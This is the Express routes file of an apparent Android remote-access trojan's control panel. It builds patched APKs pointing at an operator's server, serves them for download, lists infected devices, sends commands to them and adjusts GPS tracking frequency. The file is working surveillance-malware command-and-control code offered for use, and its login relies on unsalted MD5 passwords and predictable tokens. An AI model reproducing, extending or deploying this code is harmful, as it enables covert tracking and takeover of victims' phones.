const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser'),
    crypto = require('crypto');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

function isAllowed(req, res, next) {
    let cookies = req.cookies;
    let loginToken = db.maindb.get('admin.loginToken').value();
    if ('loginToken' in cookies) {
        if (cookies.loginToken === loginToken) next();
        else res.clearCookie('token').redirect('/login');
    } else res.redirect('/login');
    // next();
}

routes.get('/dl', (req, res) => {
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});


routes.get('/login', (req, res) => {
    res.render('login');
});

routes.post('/login', (req, res) => {
    if ('username' in req.body) {
        if ('password' in req.body) {
            let rUsername = db.maindb.get('admin.username').value();
            let rPassword = db.maindb.get('admin.password').value();
            let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
            if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
                db.maindb.get('admin').assign({ loginToken }).write();
                res.cookie('loginToken', loginToken).redirect('/');
            } else return res.redirect('/login?e=badLogin');
        } else return res.redirect('/login?e=missingPassword');
    } else return res.redirect('/login?e=missingUsername');
});

routes.get('/logout', isAllowed, (req, res) => {
    db.maindb.get('admin').assign({ loginToken: '' }).write();
    res.redirect('/');
});


routes.get('/builder', isAllowed, (req, res) => {
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
        if (!error) apkBuilder.buildAPK((error) => {
            if (!error) {
                logManager.log(CONST.logTypes.success, "Build Succeded!");
                res.json({ error: false });
            }
            else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
        else {
            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
            res.json({ error });
        }
    });
    else {
        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
        res.json({ error });
    }
});


routes.get('/logs', isAllowed, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});



routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    if (pageData) res.render('deviceManager', {
        page: req.params.page,
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid,
        pageData
    });
    else res.render('deviceManager', {
        page: 'notFound',
        deviceID: req.params.deviceid,
        baseURL: '/manage/' + req.params.deviceid
    });
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message })
        else res.json({ error })
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false })
        else res.json({ error })
    });
});

module.exports = routes;